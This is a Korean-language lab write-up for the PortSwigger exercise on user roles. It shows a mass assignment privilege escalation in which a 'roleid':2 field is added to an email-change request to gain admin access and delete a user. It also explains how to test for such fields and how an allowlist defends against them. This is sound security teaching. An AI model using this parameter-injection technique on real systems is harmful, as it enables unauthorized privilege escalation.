+++
date = '2026-07-02T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - User role can be modified in user profile'
summary = "이메일 변경 요청에 roleid 파라미터를 끼워 넣어 자신의 역할을 관리자로 올리는 mass assignment 기반 권한 상승 풀이"
toc = true
tags = ["Access Control", "Privilege Escalation", "Mass Assignment", "PortSwigger", "Apprentice"]
+++

---

## 문제 분석

> **난이도**: `APPRENTICE`  
> **Lab**: [User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)

> ![image.png](/writeup/portswigger/access-control/04/1.png)

관리자 패널이 `/admin`에 존재하며, `roleid`가 2인 로그인 사용자만 접근할 수 있다. 관리자 패널에 접근해 `carlos` 사용자를 삭제하면 문제가 해결된다. 실습 계정은 `wiener:peter`다.

### Access Control 진단

앞선 랩과 달리 이번에는 역할이 쿠키에 노출되어 있지 않다. 로그인 후 쿠키를 확인해도 `roleid`가 보이지 않으므로 서버 측에서 관리하는 값으로 보인다.

역할이 서버에 저장되어 있다면, **사용자 정보를 변경하는 요청의 응답**에서 그 구조를 엿볼 수 있다. 계정 페이지의 이메일 변경 기능을 사용해 요청을 보내고 응답을 확인한다.

```http
HTTP/2 302 Found
Location: /my-account
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 116

{
  "username": "wiener",
  "email": "access@a.com",
  "apikey": "wsyacnhEunYlN6UKGCbbQzdV6f5jb2Ds",
  "roleid": 1
}
```

`{"email":"access@a.com"}` 하나만 보낸 요청인데, 응답은 사용자 객체 전체를 돌려주며 그 안에 `roleid` 키가 드러난다. 관리자는 `roleid`가 2라고 했으니 현재 값은 1이다. 여기서 던질 질문은 하나다. **요청에 없던 `roleid`를 응답이 알고 있다면, 요청에 `roleid`를 넣으면 서버가 그것도 받아 줄까?**

---

## 익스플로잇

이메일 변경 요청 본문에 `roleid` 파라미터를 추가해 전송한다.

```http
POST /my-account/change-email HTTP/2
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
Content-Type: text/plain;charset=UTF-8

{
"email":"access@a.com",
"roleid":2
}
```

응답을 확인하면 `roleid` 값이 `2`로 변경되어 돌아온다.

```json
{
  "username": "wiener",
  "email": "access@a.com",
  "apikey": "wsyacnhEunYlN6UKGCbbQzdV6f5jb2Ds",
  "roleid": 2
}
```

이제 `/admin`에 접근하면 관리자 패널이 열린다. `carlos` 사용자를 삭제하면 문제가 해결된다.

![image.png](/writeup/portswigger/access-control/04/2.png)

![image.png](/writeup/portswigger/access-control/04/3.png)

---

## 정리

이 랩은 mass assignment(대량 할당) 결함이다. 서버가 요청 본문의 JSON을 사용자 객체에 **통째로 매핑**하면서, 어떤 필드를 사용자가 수정할 수 있는지를 제한하지 않았다. 이메일 변경 엔드포인트는 `email`만 받도록 의도되었겠지만, 실제로는 같은 객체에 담긴 `roleid`까지 받아 덮어썼다.

앞선 쿠키 위조 랩과 원리는 같다 — 권한이라는 서버의 상태를 클라이언트 입력이 결정하게 된 것이다. 다만 여기서는 그 통로가 쿠키가 아니라 **의도치 않게 열린 API 파라미터**다. 결정적인 단서는 응답이 제공했다. 요청에 넣지 않은 필드가 응답에 나타난다는 것은, 서버가 그 필드를 객체 모델의 일부로 다루고 있다는 뜻이고, 같은 모델에 쓰기가 가능할 가능성을 시사한다.

진단에서는 상태 변경 요청의 응답에 **요청에 없던 필드가 포함되는지** 살피고, 그 필드명(`roleid`, `isAdmin`, `verified`, `balance` 등)을 요청 본문에 되돌려 넣어 반영되는지 확인한다. JSON뿐 아니라 form-urlencoded에서도 동일하게 시도한다.

방어는 수정 가능한 필드를 **허용 목록(allowlist)으로 명시**하는 것이다. 요청 객체를 도메인 객체에 자동 바인딩하는 프레임워크를 쓴다면 `roleid` 같은 민감 필드를 바인딩 대상에서 제외해야 한다. 파라미터에 권한을 싣는 다른 형태는 [User role controlled by request parameter](/write-up/portswigger/access-control/write-up-portswigger---user-role-controlled-by-request-parameter/)에서 다뤘다.
